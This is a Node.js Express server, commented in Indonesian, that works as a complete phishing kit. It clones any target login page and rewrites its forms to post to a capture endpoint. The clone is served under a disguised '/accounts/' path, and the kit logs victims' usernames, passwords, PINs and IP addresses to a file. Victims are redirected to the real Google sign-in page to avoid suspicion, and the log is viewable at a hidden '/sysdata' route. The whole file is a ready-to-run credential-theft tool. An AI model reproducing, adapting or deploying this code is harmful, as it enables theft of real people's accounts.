const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Folder rahasia buat nyimpen HTML tiruan (pake titik biar ga keliatan di file manager)
const DATA_DIR = path.join(__dirname, '.data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// ============================================
// 1. BUAT LINK PHISING (Stealth Mode)
// ============================================
app.post('/api/build', async (req, res) => {
  const { targetUrl } = req.body;
  
  if (!targetUrl) return res.status(400).json({ error: 'URL target wajib diisi' });

  try {
    // Scrape web target
    const response = await axios.get(targetUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    });
    let html = response.data;
    const $ = cheerio.load(html);

    // Manipulasi form
    $('form').each((i, el) => {
      $(el).attr('action', '/api/capture');
      $(el).attr('method', 'POST');
    });

    // Generate ID random buat URL (contoh: x8f2a9)
    const randomId = Math.random().toString(36).substring(2, 10);
    const fileName = `${randomId}.html`;
    const filePath = path.join(DATA_DIR, fileName);
    
    // Simpan file tiruan
    fs.writeFileSync(filePath, $.html());

    // Balikin link stealth
    const stealthLink = `http://${req.headers.host}/accounts/${randomId}`;
    res.json({ success: true, link: stealthLink, id: randomId });

  } catch (error) {
    res.status(500).json({ error: 'Gagal nge-clone web target' });
  }
});

// ============================================
// 2. ROUTE STEALTH (Nampilin Web Tiruan)
// ============================================
// Route ini bikin URL-nya keliatan kayak path internal web lu, bukan /phising/
app.get('/accounts/:id', (req, res) => {
  const filePath = path.join(DATA_DIR, `${req.params.id}.html`);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    // Kalo ID ga ada, redirect ke Google asli biar ga curiga
    res.redirect('https://accounts.google.com');
  }
});

// ============================================
// 3. TANGKAP DATA
// ============================================
app.post('/api/capture', (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const time = new Date().toISOString();
  
  // Bersihin nama field (kadang web pake name="identifier" atau "email")
  let userVal = data.email || data.username || data.identifier || data.phone || Object.values(data)[0] || '-';
  let passVal = data.password || data.pass || data.pin || Object.values(data)[1] || '-';

  const logData = `[${time}] IP: ${ip} | User: ${userVal} | Pass: ${passVal}\n`;
  fs.appendFileSync('captured.txt', logData);
  
  // Notifikasi di console (buat lu pantau)
  console.log('\x1b[31m%s\x1b[0m', '===================================');
  console.log('\x1b[31m%s\x1b[0m', '[!] TARGET TERTANGKAP');
  console.log(`[!] IP: ${ip}`);
  console.log(`[!] Data: ${userVal} | ${passVal}`);
  console.log('\x1b[31m%s\x1b[0m', '===================================');

  // Redirect ke Google asli biar target ngira dia salah password
  res.redirect('https://accounts.google.com');
});

// ============================================
// 4. LIHAT DATA (Endpoint Rahasia)
// ============================================
app.get('/sysdata', (req, res) => {
  if (fs.existsSync('captured.txt')) {
    res.send(`<pre style="background:#000;color:#0f0;padding:20px;font-size:14px;">${fs.readFileSync('captured.txt', 'utf-8')}</pre>`);
  } else {
    res.send('Belum ada data masuk.');
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`[SERVER] Jalan di port ${process.env.PORT || 3000}`);
});
